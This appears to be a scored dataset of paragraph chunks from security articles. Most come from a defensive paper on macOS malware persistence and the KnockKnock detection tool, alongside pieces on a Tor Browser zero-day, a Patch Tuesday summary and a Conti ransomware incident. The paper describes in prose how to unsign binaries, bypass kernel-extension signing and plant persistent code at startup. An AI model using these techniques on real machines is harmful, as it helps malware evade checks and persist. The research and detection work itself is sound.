Contrary to popular belief, Gatekeeper (like XProtect), is fairly limited in the attacks it can prevent. Specifically, it is limited to only preventing attacks where users are coerced into downloading and installing malicious content (e.g. fake Flash installers or ‘media plug-ins’), from infected or rogue websites. This is due to the fact that Gatekeeper will only examine binaries that contain a quarantine attribute. As previously mentioned, this attribute must be set by the downloading application. Thus binaries downloaded as the result of a ‘drive by’ exploit-based attack will not be subjected to examination. Interestingly, this is precisely how employees of Apple, Facebook and Twitter were recently infected by malware which ‘bypassed OS X Gatekeeper protection’ [7].
Another shortcoming is based on the fact that, in its default configuration, Gatekeeper may allow any signed application to execute. Hence if a malware sample is signed with a valid Apple Developer ID (code-signing certificate), it may be able to ‘bypass the Gatekeeper security feature’ [8].",0.010264569564101267
"Signed applications
Borrowing from iOS, OS X now verifies all binary signatures. This is important as it allows the OS to verify that binaries have not been subverted (e.g. infected by a virus). Binary infection is a powerful technique as it affords an attacker a way to persist, hide, and inherit trust. For example, imagine a malicious piece of code that infects Safari. Every time the user launches Safari, the malicious code is also executed (persistence). Since the malicious code may exist solely within the infected binary, no external malicious files or processes are required (stealth). Finally, as the browser is expected to access network resources, malicious code hosted within its process space should also be able to access the network (inheriting trust), even if a personal firewall is installed.
So what happens if malware infects a signed application or binary? Well, when loading signed binaries (or applications), the OS loader will check the digital signature. Any modifications will invalidate this signature, easily allowing the loader to detect any subversions. By design, the OS loader will then immediately terminate (crash) the modified binary.
Figure 4. OS X loader terminating a modified signed application.
On OS X (unlike iOS), unsigned apps are allowed to execute freely. During the loading process, the OS loader checks whether the binary is signed by looking for an embedded LC_CODE_SIGNATURE block. If it finds one, it verifies the binary’s signature. However, research has revealed that if the LC_CODE_SIGNATURE signature block is removed, the loader performs no verifications, allowing the binary to be modified with no consequences. This is a rather big security issue, as any signed application can be unsigned, then infected with viral code, and will still be allowed to execute.
To illustrate this security weakness, a python script (unsign.py) was created to ‘unsign’ and infect Apple’s signed applications. The script is shown in Figure 5.
Figure 5. Unsigning (and modifying) an Apple signed application.
As shown in Figure 4, Safari was previously terminated when the OS loader detected a modification. However, as Figure 5 illustrates, once unsigned, Safari, can be modified, and still able to execute without interference or termination.",0.021714818536793135
"Signed kernel extensions
In order to protect the kernel from malicious code (i.e. rootkits), all kernel extensions (or ‘kexts’) are required to be signed on OS X Mavericks. An unsigned or modified kext will fail to load. Unfortunately for Apple, it turns out that this anti-malware mechanism is trivial to bypass. The first method of bypassing these code-signing requirements is described in [9]. In a nutshell, the user-mode daemon that loads kernel extensions (kextd) is responsible for verifying the signature. Yes, the signature is verified in user mode – fail! This is clearly a security issue, since it means that an attacker can easily subvert (turn off) the user-mode checks, then load any unsigned kext. As described in [9], this can be accomplished by injecting code into the kextd, then patching out the code-signing checks (in the checkKextSignature() function). For illustrative purposes, this can also be accomplished via a debugger, as shown in Figure 6.
Figure 6. Patching out kext code-signing requirements.
The publicly described technique requires some pretty low-level hacking (e.g. code injection and in-memory patching). Research performed at the start of the year revealed a non-public, 0-day technique that allowed any unsigned kext to be loaded. (This technique (or a slight variation) was later discussed independently at Black Hat Asia by Team T5 [10].) By first stopping the daemon that is responsible for loading kernel extensions (kextd), then attempting to load the unsigned kext with the kextload command, an alternate code path is executed. This code path loads the kext directly into the kernel, bypassing the logic that enforces the kext code-signing requirements.
In the case of computer security, ignorance is not bliss. The various weaknesses in the OS X anti-malware/security mechanisms presented above should be a cause for concern for the ever-growing Mac user base, especially as OS X malware is an ever-growing threat. One way to combat such threats is to gain a thorough understanding of the Mac system startup process, identifying methods of persistence that are abused by OS X malware. With this information, persistent malware may be detected generically or, ideally, even prevented.",0.01538216524909053
"Mac system startup
Before cataloguing methods of persistence abused by OS X malware, it is important to understand what happens when a Mac is powered on.
The boot/startup process is somewhat complex, but can be broken down into easily understandable stages. These stages include power-on/boot, kernel initialization, the execution of launchd daemon, and the LoginWindow process. It should be noted that many of the low-level technical details of the startup process are beyond the scope of this paper. However, interested readers are encouraged to consult [11] for a very comprehensive and thorough discussion of the entire startup process.
Early startup covers everything from power-on, until the kernel (OS X) begins execution. Once power is present, the bootROM takes over. The bootROM, or firmware, is the first code to execute. It verifies memory, begins hardware initialization and selects the OS partition. Once complete, the bootROM executes the boot.efi program. This performs a variety of actions such as initializing the device tree (IO registry), locating and loading the kernel into memory, loading any boot kernel extensions, and finally jumping to the kernel’s entry point.
Once the early boot stage is complete, OS X begins its initialization. This starts with the kernel, which is composed of various sub-systems (each of which must be initialized). First, the Mach subsystem is initialized, then IOKit loads all device specific kexts. Finally, the BSD subsystem initializes, which most notably includes executing launchd, the first user mode process.
Launchd, as its name suggests, launches all daemons and agents (both of which are somewhat conceptually similar to Windows services). As the first process (pid of 0x1), it is an ancestor of all other processes.
The final step before reaching the desktop is authenticating the user. This is handled by the LoginWindow process, which authenticates the user, sets up their environment, and then hangs around to manage the user’s session. Once the user is presented with their desktop, the Mac system startup process is complete.",0.024042113604969995
"Methods of persistence
A decent understanding of the Mac startup process provides the necessary background for examining the ways in which it may be abused to achieve persistence. Before diving in, recall that persistence is essential for malware, as it ensures that whenever a computer is restarted, the malicious code is automatically re executed by the OS.",0.011385806697139955
"Low-level/pre-OS X
Starting at the lowest level, there are several options for persistence. While these options are complex, and often hardware specific, they run ‘below’ (before) the OS, and thus are very difficult to detect. Possible low-level options for persistence may include: re-flashing the firmware, installing a malicious EFI component, or even infecting boot.efi. It should be noted that, due to the complexities of these techniques, each could fill a paper unto themselves. For a more in-depth analysis of low-level methods of persistence, interested readers should consult [12], an intriguing paper on Mac EFI rootkits.",0.014030715983175512
"Kernel extensions
Since code in the kernel runs at the highest privilege level, it is a great place for advanced malware to live. Malware that executes here is often referred to as a rootkit. It is fairly trivial to create a persistent kernel extension that will automatically be executed by the OS whenever the computer is restarted. First, a kext can be created via the ‘Generic Kernel Extension’ template in XCode, as described in Apple’s documentation [13]. It is important to set the kext’s match category (in its Info.plist) to ‘IOResources.’ As described in [11], this is ‘a special provider class that provides system-wide resources’ and ensures that, once installed, the kext will automatically be started by OS X.
To install a kext persistently, it should be copied into one of the OS X kext directories: /System/Library/Extensions or /Library/Extensions.
Once copied to an install directory, the kext should be set to be owned by root and, optionally, the kernel cache rebuilt. If these steps are followed, the kext will automatically be loaded each time the OS is (re)loaded.
Figure 7. Installing a persistent kernel extension.
As mentioned previously, starting with OS X Mavericks, kext extensions must be signed. However, malware may abuse several previously stated methods in order to bypass this requirement.",0.015238586984827607
"Launch daemons/agents
While code that runs in the kernel is very powerful, it is difficult to get right. Running in user mode is far simpler and thus often preferable. Launch daemons and agents are the ‘Apple-approved’ way to persist non-application binaries (e.g. software updaters, anti-virus products, etc.). Both launch daemons and launch agents are commonly abused by OS X malware as a means to gain persistence. Launch daemons are non interactive, and run before user login. On the other hand, launch agents run once the user has logged in, and may be interactive. Creating a persistent launched daemon or agent is as simple as creating the binary, then placing a configuration property list in one of the launch daemon or agent directories, as shown in Table 1.
Launch daemon (plist) directories
Launch agent (plist) directories
/System/Library/LaunchDaemons
/System/Library/LaunchAgents
/Library/LaunchDaemons
/Library/LaunchAgents and ~/Library/LaunchAgents
Table 1. Launch daemon/agent plist directories.
Property lists (or ‘plists’ in Apple parlance) are xml files that are used by OS X to store serialized objects. In the case of the launch daemons and agents, there is a plist for each daemon or agent that contains required configuration information. These files are processed by the OS as part of its initialization process and can contain key value pairs that may instruct the OS to automatically start the daemon or agent. Figure 8 shows a snippet from an example launch daemon/agent configuration plist file. Besides containing the path to the binary image of the daemon or agent (and any program arguments), it also contains a key value pair (RunAtLoad: true), to indicate that it should be started automatically by the OS.
Figure 8. A launch daemon/agent plist.",0.016655356401970245
"Cron jobs
Containing a large amount of BSD code and logic within its core, OS X presents many ‘Unix-y’ flavoured persistence mechanisms that may be abused by OS X malware. Cron jobs are an example of exactly this. OS X supports cron jobs, which can be used to execute a command or script at certain intervals. For example, Figure 9 illustrates how a cron job can be created to echo some text each minute. To register the cron job, the command to execute is saved to file, then registered via the crontab command. To confirm the registration of the command, the crontab command is re-executed with the ‘-l’ parameter.
Figure 9. Cron job creation/enumeration.",0.014770291662423052
"Login/logout hooks
By creating a login or logout hook, a script or command can automatically be executed whenever a user logs in or out. Apple states that these hooks are deprecated [14], but they still work on OS X Mavericks. The ‘defaults’ command can be used to create such a hook. Simply specify a write action, the com.apple.loginwindow.plist file, and then script or command to persist (see Figure 10).
Figure 10. Creation of a login hook.",0.013727917250749733
"Login items
For applications, login items are the ‘Apple-approved’ way to persist. Anything that’s registered as a login item is visible in a GUI, via the System Preferences app. Login items are stored in the user’s Library/Preferences directory, in a plist file named com.apple.loginitems.plist. This file contains an entry for each login item, which contains the name of the item, whether it should be hidden, and base64-encoded data containing the path to the persistent application. Login items can be created via the GUI, programmatically by utilizing the ‘launch services’ API, or by directly manipulating the login item’s plist (com.apple.loginitems.plist).
Figure 11. Login item: in the GUI and plist.",0.012361473024351088
"Sandboxed login items
With the introduction of the application sandbox, applications downloaded from the Mac application store can no longer create or register themselves as traditional login items. To maintain compatibility, Apple designed a new way in which sandboxed applications could create login items. In order to register an application persistently in this manner, two applications are required: a main application and a helper. The application to persist (the helper), should be placed into a LoginItems sub directory of the main application, as shown in Figure 12.
Figure 12. Required layout for a sandboxed login item.
Once executed, the main application should invoke the SMLoginItemSetEnabled() function. This function causes the helper application to persist, and ensures that it will automatically be executed whenever the user logs in.
Figure 13. Code to persist a sandboxed login item.",0.016652658362224848
"Re-opened applications
OS X recently introduced a feature that automatically reopens applications whenever the user (re)logs in. The applications to reopen are stored in a plist within the user’s Library/Preferences/ByHost directory. Viewing the contents of this plist reveals keys such as the ID of the application, whether to hide it, and of course the path to the application. While there is not a (documented) programmatic API to manipulate the re-opened application plist directly, it may be possible to modify it directly in order to gain persistence.
Figure 14. Plist entry of a re-launched application (terminal.app).",0.013906041696067906
"Startup items
Another deprecated technique that still works on OS X Mavericks is ‘startup items’. Apple documentation explains that startup items allow a command or script to automatically be executed during OS X initialization. Creating a startup item involves placing two files into a startup item directory. The first file is a script that is to be executed automatically. The other file must be named ‘StartupParameters.plist’ and must contain a ‘Provides’ key that contains the name of the script file. Both of these files should be placed in a sub-directory in either the /System/Library/StartupItems or /Library/StartupItems directory. The name of the sub-directory must be the same as the name of the script file (and the value of the ‘Provides’ key in the StartupParameters.plist). Figure 15 illustrates the required file-system layout of a startup item.
Figure 15. Directory structure of a startup item.",0.021015395812752025
"Rc.common
RC scripts are used in another BSD-flavoured persistence technique that works on OS X, allowing scripts or commands to automatically be executed. For example, the rc.common file can be edited to insert arbitrary commands that will automatically execute when OS X starts.
Figure 16. Injecting commands into rc.common.",0.011270862874399157
"Launchd.conf
Recall that launchd is the first user-mode program to execute during OS X’s initialization. The launchd.conf file, as its name suggests, contains configuration parameters for launchd. As launchd.conf can contain arbitrary commands (via the bsexec command), malware can inject malicious instructions in order to achieve persistence.
Figure 17. Injecting commands into launched.conf.",0.012545999943824881
"DYLD_INSERT_LIBRARIES
Via the DYLD_INSERT_LIBRARIES environment variable, OS Xprovides a way to load arbitrary dynamic libraries (‘dylibs’) into a process. Specifically, when loading a process, the dynamic loader will examine the DYLD_INSERT_LIBRARIES variable and load any libraries it specifies. By abusing this technique, an attacker can ensure that a malicious library will persistently be loaded into a targeted process whenever that process is started.
There are two main ways to set the DYLD_INSERT_LIBRARIES environment variable so that arbitrary libraries will be loaded into a specific (targeted) process. When targeting a launch daemon or agent, an ‘EnvironmentVariables’ dictionary may be added to launch item’s plist. For targeting an application, the application’s Info.plist can be altered to contain a ‘LSEnvironment’ dictionary, seeFigure 18.
Figure 18. The application’s Info.plist is altered to contain a ‘LSEnvironment’ dictionary.",0.01475502531615891
"Mach-O binary infection
Computer viruses are one of the oldest forms of malware. Viruses infect files by injecting viral code in order to replicate. However, this viral code can also provide persistence: any time the infected binary is executed, the virus code will be executed as well. Since OS X binaries (and applications) can be unsigned, viral infection may be back in fashion! There are many ways to infect an OS X (mach-O) binary. The simplest method, described initially by the (in)famous VX’er roy g biv, involves injecting some viral code into a target binary, then hijacking the entry point to point to the virus code.
Figure 19 shows the LC_MAIN load command within an uninfected macho-O binary. This load command contains the ‘Entry Offset,’ or entry point, which may be hijacked during infection (to point to the viral code).
Figure 19. Mach-O binary structure/entry offset.",0.014885851874180345
"Application-specific persistence
The final persistence mechanism covered in this paper is more of a generic class: application-specific persistence. Many applications (such as browsers) support plug-ins, which are generally dynamic libraries that are loaded automatically when the application is run. While plug-ins can legitimately extend the functionality of an application, malware can abuse this functionality to gain persistence. Applications that may be subverted include browsers such as Safari, Firefox and Chrome, or others such as iTunes [15].
It should be noted that sometimes it may be challenging to coerce an application to execute a malicious plug-in (it might load the plug-in, then decide it doesn’t like it). However, if the persistent plug-in exports a constructor (see Figure 19), it will automatically be executed (by the OS loader) as soon as it is loaded. Thus, even if the host application rejects the plug-in, it is too late as persistent code execution has already been achieved.
Figure 20. Dynamic library (plug-in) constructor.",0.01391366273878436
"Rest in peace
While researching methods of malware persistence, several previously functional persistence techniques were found to have either been fully deprecated or removed in OS X Mavericks. These include modifying environment.plist, modifying com.apple.SystemLoginItems.plist and setting an ‘AutoLaunchedApplicationDictionary’ within the /Library/Preferences/loginwindow file.
While these methods of persistence are (or were?) common in older OS X malware samples, they are likely to fade into oblivion as they no longer work on the latest version of OS X.",0.011897026829978397
"Persistent OS X malware
While not all of the methods of persistence presented are (yet) abused by OS X malware, many are. The following section examines several OS X malware samples and reveals their persistence mechanisms.",0.013155454132593447
"OSX/CallMe
A few years ago, somebody (likely the Chinese government), started targeting Tibetan activists with malicious Word documents that attempted to exploit CVE-2009-0563. The payload of these attacks was named OSX/CallMe [16]. This malware was fairly basic, providing the attackers with the ability to execute arbitrary commands on an infected host, as well as exfiltrating the victim’s contacts (address book) [17]. In order to persist, CallMe installs itself as an auto launched launch daemon. Specifically, it creates a launch daemon plist, realPlayerUpdate.plist, within the /Library/LaunchDaemons directory that references the malware’s binary, .realPlayerUpdate (see Figure 21).
Figure 21. CallMe’s launch daemon persistence.",0.011927055620909899
"OSX/Flashback
Flashback shattered the notion that OS X was immune to malware. By exploiting a known, but unpatched Java vulnerability, Flashback was able to automatically infect users as they visited a compromised or malicious website. At its height, it amassed over 600,000 infected hosts, making it the most ‘successful’ OS X malware to date [18]. Flashback’s goal was simply financial gain – by injecting ads into users’ web sessions. To ensure it was (re)executed each time an infected computer was rebooted, it installed itself as a user launch agent (com.java.update.plist, .jupdate). (See Figure 22.)
Figure 22. Flashback’s launch agent persistence.",0.01299342404875059
"OSX/Crisis
According to online sources, OSX/Crisis is ‘an expensive rootkit used by governments’ [19]. Delivered via targeted exploits, it provides extensive surveillance capabilities by collecting audio, images, screenshots and keystrokes. Crisis also employs some fairly sophisticated stealth capabilities via a rootkit (kernel) component that can hide processes and files. Figure 23 illustrates some pseudo-disassembly, revealing the malware building a path to a file within the user’s launch agent directory. In other words, the disassembly shows the malware preparing to persist as a launch agent.
Figure 23. Crisis’ launch agent persistence.",0.013317877091136077
"OSX/Janicab
Janicab is a somewhat unique OS X malware sample, as it is written in Python (though compiled for distribution). The malware is also signed with an Apple Developer ID, probably in an attempt hide its maliciousness and thwart Gatekeeper. Since it is written in Python, the malware is easy to analyse and uncovering its persistence mechanism is trivial. As may be seen in the malware installer’s code, a cron job (set to execute every minute) is created to ensure that the malware is persisted (see Figure 24). It should be noted that once the malware is installed, the crontab -l command easily reveals the malicious cron job.
Figure 24. Janicab’s cron job persistence.",0.012900656629319607
"OSX/Kitmos
Kitmos is another OS X malware sample that targets activists. Discovered on an activist’s computer during the Oslo Freedom Forum Workshop, Kitmos takes screenshots and uploads them to a remote command and control server [20]. As the disassembly in Figure 25 shows, the malware invokes the LSSharedFileListInsertItemURL() function to add itself as a login item for the current user. Once registered as a login item, the malware will automatically be (re)executed by the OS whenever the user logs in.
Figure 25. Kitmos’ login item persistence.",0.012723504815797537
"OSX/Yontoo
It is fairly common for malware to use social engineering tricks to coerce the user into infecting themselves. Yontoo masquerades as an ‘HD video codec’ to trick users who visit compromised or malicious websites into installing the malware. The malware creates malicious plug-ins for Safari, Firefox and Chrome. This allows the malware to automatically be executed whenever the user launches their browser. Once loaded into the context of the browser’s process content, the plug-ins transmit information about the loaded pages to a remote server as well as injecting ads into the user’s browsing session (see Figure 26).
Figure 26. Yontoo’s browser extension(s) persistence.",0.014172244143710544
"OSX/Renepo
Renepo is an older OS X malware sample that disables security mechanisms before downloading and executing other ‘hacker tools’ such as password crackers [21]. Since this malware is a script (which helpfully includes comments), it is easy to understand its installation and persistence logic. As shown in Figure 27, it persists as a startup item.
Figure 27. Renepo’s startup item persistence.",0.008529668085001219
"OSX/MacProtector
MacProtector is a fake (or ‘rogue’) anti-virus product. When a user visits a compromised or malicious website, MacProtector tries to convince the user that their computer is infected and that they should download an application to ‘fix’ it [22]. Unfortunately, if the user allows the downloaded installer to complete, they become infected with MacProtector. Reverse engineering this malware reveals that it installs itself as a login item. Though this will cause the malware to persist, it will also make it appear in the GUI (as well as in the login item’s plist). (See Figure 28.)
Figure 28. MacProtector’s login item persistence.",0.01308783139822478
"OSX/Clapzok
The previously discussed OS X malware samples are generally all stand-¬alone binaries or applications. OSX/Clapzok bucks this trend: it is a classic virus that infects binaries both to spread and to gain persistence [23]. It works by injecting viral code into a binary, then hijacking the entry point. However, since Clapzok infects signed apps (without un-signing them), it will likely cause major annoyances and, as a result, will be easily discovered (see Figure 29).
Figure 29. Clapzok’s mach-O infection persistence [23].",0.012986424699450327
"KnockKnock
Research into persistence mechanisms on OS X has revealed many locations within the boot process and OS startup sequence that can be abused by malicious code. As we have shown in this paper, many OS X malware variants exist in the wild that are abusing several of these persistence mechanisms. Although Apple has introduced several anti-malware mitigations, these clearly fall short, as OS X users worldwide continue to be infected.
In order to generically detect persistent OS X malware, a new tool has been created that can enumerate and display persistent OS X binaries. Named KnockKnock, its goal is simple: to tell you who’s there! Armed with this tool, users can ensure that they are protected against both current and future OS X threats.
There are many methods of persistence on OS X – and new ones are sure to be found. As such, the open-source, Python-based KnockKnock [24] was designed to use a plug-in-based architecture, where each plug-in can scan for a particular persistence technique. When new persistence techniques are discovered, KnockKnock can easily be extended with new plug-ins. Luckily, as its core performs most of the work, writing a plug-in is incredibly simple. This is illustrated in the example in Figure 30, which shows the main logic for a plug-in that enumerates all launch daemons that are set to execute automatically as a Mac computer boots up.
Figure 30. KnockKnock launch daemon plug-in.
As the code snippet in Figure 30 illustrates, it only takes about 10 lines of Python code for this plug-in to enumerate a specific persistence class. (For more details, including a comprehensive plug-in-writing guide, see [24].)
KnockKnock has the ability to display persistent OS X binaries that are set to execute automatically at each boot. Since KnockKnock takes such an unbiased approach, it can generically detect persistent OS X malware today, as well as in the future. It should be noted though, that this approach will also list legitimate binaries. However, as KnockKnock can filter out unmodified Apple-signed binaries, the output is reduced by a factor of roughly 90%, generally leaving a handful of binaries that can quickly be examined and verified manually.
The screenshots in Figure 31 and Figure 32 show KnockKnock revealing various OS X malware infections, including OSX/Janicab (cron job) and OSX/CallMe (launch daemon).
Figure 31. KnockKnock Janicab (runner.pyc) detection.
Figure 32. KnockKnock CallMe (.realPlayerUpdate) detection.",0.014819599349673807
"Conclusion
Even in the latest version of Mac OS X, Apple’s anti-malware mitigations fall far short, allowing OS X malware to become an ever more pervasive reality. However, by thoroughly understanding the Mac’s startup process, points of persistence can be identified, which allow for the generic detection of malware. KnockKnock, an open-source tool, aims to aid in this detection and to ensure that everyday users are protected against both current and future OS X threats.",0.015868293166476866
"Bibliography
[1] IDC Worldwide Quarterly PC Tracker, 9 January 2014. http://www.idc.com/getdoc.jsp?containerId=prUS24595914.
[2] Apple passing Microsoft. http://ben-evans.com/benedictevans/2014/2/12/apple-passes-microsoft.
[3] Apple homepage. 2012. http://www.apple.com/.
[4] Ször, P. The Art of Computer Virus Research and Defense. Symantec Press. 2005.
[5] F-Secure Threat Report, H1 2013. http://www.f-secure.com/static/doc/labs_global/Research/Threat_Report_H1_2013.pdf.
[6] OS X: About Gatekeeper. http://support.apple.com/kb/ht5290.
[7] Mac malware that infected Facebook bypassed OS X Gatekeeper protection. http://arstechnica.com/security/2013/03/mac-malware-that-infected-facebook-bypassed-os-x-gatekeeper-protection/.
[8] Researchers find more versions of digitally signed Mac OS X spyware. http://www.macworld.com/article/2039640/researchers-find-more-versions-of-digitally-signed-mac-os-x-spyware.html.
[9] Breaking OS X signed kernel extensions with a NOP. http://reverse.put.as/2013/11/23/breaking-os-x-signed-kernel-extensions-with-a-nop.
[10] You can’t see me. http://www.blackhat.com/docs/asia-14/materials/Tsai/Asia-14-Tsai-You-Cant-See-Me-A-Mac-OS-X-Rootkit-Uses-The-Tricks-You-Havent-Known-Yet.pdf.
[11] Levin, J. Mac OS X and iOS Internals: To the Apple’s Core. Wrox. 2012.
[12] DE MYSTERIIS DOM JOBSIVS Mac EFI Rootkits.http://ho.ax/De_Mysteriis_Dom_Jobsivs_Black_Hat_Paper.pdf.
[13] Creating a Device Driver with Xcode. https://developer.apple.com/library/mac/documentation/Darwin/Conceptual/KEXTConcept/KEXTConceptIOKit/iokit_tutorial.html#//apple_ref/doc/uid/20002366.
[14] Customizing Login and Logout. https://developer.apple.com/library/mac/documentation/macosx/conceptual/bpsystemstartup/chapters/CustomLogin.html.
[15] iTunes Evil Plugin Proof of Concept. http://reverse.put.as/2014/02/15/appledoesntgiveafuckaboutsecurity-itunes-evil-plugin-proof-of-concept/.
[16] New Targeted Attack on Tibetan Activists Using OS X Discovered. http://www.intego.com/mac-security-blog/new-targeted-attack-on-tibetan-activists-using-os-x-discovered/.
[17] New CallMe malware discovered. http://www.thesafemac.com/new-callme-malware-discovered/.
[18] Kaspersky Lab confirms Flashfake/Flashback botnet infected more than 600,000 Mac OS X Computers. http://www.kaspersky.com/about/news/virus/2012/Kaspersky_Lab_Confirms_Flashfake_Flashback_Botnet_Infected_more_than_600_000_Mac_OS_X_Computers_Describes_Ramifications_and_Remedies.
[19] New OSX/Crisis or Business Cards Gone Wild. http://www.intego.com/mac-security-blog/new-osx-crisis-business-cards-gone-wild/.
[20] OSX Kitmos analysis. http://blog.sbarbeau.fr/2013/05/osx-kitmos-analysis.html.
[21] Renepo worm targets Mac OS X users, Sophos reports. http://www.sophos.com/en-us/press-office/press-releases/2004/10/va_renepo.aspx.
[22] Mac Security Threats: How Vulnerable Is Apple? http://content.time.com/time/business/article/0,8599,2075218,00.html.
[23] Clapzok.A: reversing the OS X part of a multiplatform PoC infector. http://reverse.put.as/2013/05/31/clapzok-a-reversing-the-os-x-part-of-a-multiplatform-poc-infector/.
[24] KnockKnock. https://github.com/synack/knockknock.
",0.015038769518860517
"Tor Browser zero-day strikes again
Update (12/2): According to Forbes, this zero-day was sold by Exodus Intel earlier this year and somehow got leaked. Additional coverage here from Motherboard.
A newly found vulnerability (CVE-2016-9079) in the Firefox web browser was found to be leveraged in the wild. It is not the first time this has happened, as some of you may recall back in 2013, the FBI used a nearly identical one to expose some users running the Tor Browser.
The Tor Browser (based on Mozilla Firefox Extended Support Release) is used worldwide by all people who want greater anonymity online which includes political activists or dissidents wanting to bypass limitations or surveillance put in place by oppressive regimes.
According to Mozilla, “the exploit took advantage of a bug in Firefox to allow the attacker to execute arbitrary code on the targeted system by having the victim load a web page containing malicious JavaScript and SVG code“.
Via this exploit, an attacker can collect the victim’s IP and MAC addresses, as well as their hostname which it sends to a remote server (5.39.27.226). This server is now down, but we were able to reproduce the exploit and observe the TCP packets where the data would be sent.",0.010993059399766025
"It’s worth noting that not all exploits are meant to infect the target machine. In this case, for example, the goal is to leak user data with as minimal of a footprint as possible. There’s no malicious code downloaded to disk, only shell code is ran directly from memory.",0.008860274504431054
"It would be very easy for attackers to change the payload and instead of trying to identify a user via their IP address they could push anything they wish. Watch this proof of concept launching calc.exe.
This zero-day can be thwarted by adjusting the security slider to ‘High’ within Tor Browser’s Privacy and Security Settings, but that is not the default option. Alternatively, people running Malwarebytes Anti-Exploit were already protected against this 0day.
This latest attack continues to increase the concern over the Tor Brower’s efficacy against exploits and how other browsers such as Google Chrome or Edge work to handle memory corruption and sandboxing. One thing is for sure, browsers and their plugins remain the best attack vector to deliver malware or leak data via drive-by attacks.
Both Mozilla and Tor have released a patch to address this zero-day.
",0.010788323454550497
"DHCP, Edge, Office, Hyper-V Receive Critical New Year Updates",0.011202381930491945
"Just connecting to a (malicious) wireless network could lead to Bad Things Happening, but none of the patched bugs have been seen in the wild (yet!)",0.009101683659363369
"Written by
SophosLabs Offensive Security",0.008622298185940958
"January 28, 2019",0.009158460652895384
SophosLabs Uncut DHCP Edge Hyper-V Microsoft Patch Tuesday,0.007874583593900475
"Earlier this month, Microsoft released their first Patch Tuesday update of 2019. For some users, these patches are still rolling out. The update includes fixes for 48 security vulnerabilities found in Windows and other Microsoft products.
None of the fixed vulnerabilities are reported to have been exploited in the wild.
Of these, 13 are remote code execution vulnerabilities affecting Office applications (Word, Visual Studio, and the Jet Database Engine used in Office suite apps).
A total of 10 of the fixed vulnerabilities allow for elevation of privilege, a vulnerability class that allows an attacker with initial access to a system to gain more control over it.
Another 5 remote code executions vulnerabilities affect the two Microsoft web browsers, Edge and Internet Explorer.
It’s worth reminding readers that the availability of patches does not mean that your computer has installed them, yet. To find and download this month’s Cumulative Update patch yourself, search for the term “2019-01” at the Microsoft Update Catalog website.
Here are some more details about a few of the more notable vulnerabilities:
Windows DHCP Client
Microsoft fixed a critical remote code execution bug, designated CVE-2019-0547.
This one was found by Microsoft internal bug hunters; no specific details were provided, but this vulnerability is notable because DHCP clients are on every Windows machine, operating as headless network services. Microsoft must have thought so, as well, since it has a high Base CVSS score given to it by Microsoft: 9.8, which rates it severe enough to merit immediate attention.
One might speculate that a DHCP client vulnerability potentially opens the system to being compromised when the victim connects to a rogue network (a hypothetical malicious public WiFi), or, possibly, if an infected machine acts as a malicious DHCP server. An attack of this nature is highly likely to occur without it being visible to, or requiring any interaction from, the user.
Edge Web Browser
Important updates to Edge include fixes for four critical bugs. Three of the vulnerabilities (CVE-2019-0539, CVE-2019-0567, CVE-2019-0568) affect Edge’s Chakra JavaScript engine, and one (CVE-2019-0565) impacts the EdgeHTML layout engine. A remote attacker, running a malicious website, could exploit any of these to gain control of a Windows machine unlucky enough to browse to it.
Internet Explorer MSHTML Engine
The company fixed a bug, rated “Important” (CVE-2019-0541), that allows attackers to run remote code on the victim’s machine. The exploit takes advantage of a built-in Microsoft Office component in Internet Explorer, if two conditions are met: the victim visits a malicious website, and the victim interacts with the browser’s menu bar. If this is anything like other Office exploits, the “interaction” may be to dismiss or disable a security warning dialog, but we don’t know.
Hyper-V
The company fixed two critical bugs (CVE-2019-0550 and CVE-2019-0551) that could result in a VM “escape” situation, where code on a guest virtual machine could jump out onto the host machine it’s running on.
Virtual machines are often used to create segregated virtual environments where unsafe programs can be run without the risk of them having any effect on the host machine, so this is troubling for those who use Hyper-V for this purpose. Chinese security company 360 Qihoo claimed credit for reporting a Hyper-V escape bug to Microsoft, netting the researcher a $200,000 bug bounty. Not a bad payout! Microsoft’s Bug Bounty Program offers rewards for bugs in Hyper-V that are among the highest the company will pay.
How is Sophos responding to these threats?
Sophos has released following detection to address the vulnerabilities mentioned above.   Please note that additional vulnerabilities and corresponding detection may be released in the future.",0.01804733178373552
"CVE
SAV
IPS
Intercept-X",0.010185298729769032
CVE-2019-0539,0.009325756874740687
"sid:9000798
N/V",0.007989193742488743
"CVE-2019-0541
TBA
sid:9000800, sid:9000799
N/V",0.009131367758637543
CVE-2019-0565,0.009045765668777794
"sid:9000801
N/V",0.007851227389300441
"CVE-2019-0567
TBA
sid:9000802
N/V",0.008880078073375208
CVE-2019-0568,0.00917563996661619
"sid:9000754
N/V",0.007848483801597528
"N/V = Not Validated. The proof-of-concept code provided with MAPP advisories does not include active exploits, and as such is not applicable to Intercept X testing. The IX ability to block the exploit depends on actual exploit weaponization approach, which we can’t target until we spot it in the wild. The SAV and IPS detections developed for the PoCs do not guarantee interception of in-the-wild attacks
TBA = to be added.
How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. Please note that some detection might not be available due to the availability of the data.
It is mostly not possible to test with Intercept-X due to the nature of the data we receive.",0.01012272132033143
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
A Conti ransomware attack day-by-day,0.015485675675492083
"Written by
Michael Heller",0.008758043479553224
"February 16, 2021",0.010371692824301837
Security Operations Conti DLL injection MTR•Rapid Response Ransomware Rapid Response Sophos Rapid Response,0.014022057558236045
"Editor’s note: This is one of a series of articles focused on the Conti ransomware family, which include technical details of the Conti ransomware, Conti ransomware: Evasive by nature, and a guide IT administrators can use to deal with the impact of an attack involving Conti ransomware, What to expect when you’ve been hit with Conti ransomware.
Conti ransomware is a global threat affecting victims mainly in North America and Western Europe. Sophos Rapid Response has encountered multiple confirmed Conti ransomware attacks in the past six months. Sophos operators also strongly believe they encountered what would have been another incident of Conti had they not stopped the attack before ransomware was deployed.",0.015541054630924256
"Since its first appearance, Conti was assumed to be the successor to Ryuk with one crucial difference in that the group behind Conti threatens to leak exfiltrated data to strong-arm victims into paying the ransom. This use of exfiltrated data means organizations from almost any industry could be targeted, although the Conti group has hit organizations in retail, manufacturing, construction, and the public sector more often.",0.018618625332780803
"One confirmed case involved an attack on an organization who was able to remove the attacker from one server only to find the attacker had gained access to two servers at the same time. Despite the company’s efforts, Sophos Rapid Response needed to be called in to deal with a Conti ransomware attack against nearly 300 endpoints.
It took just over 2.5 hours for the Rapid Response team to determine what accounts and devices were affected, what tools were used in the attack, block the attack from continuing, and walk the customer through the process of the Rapid Response engagement.
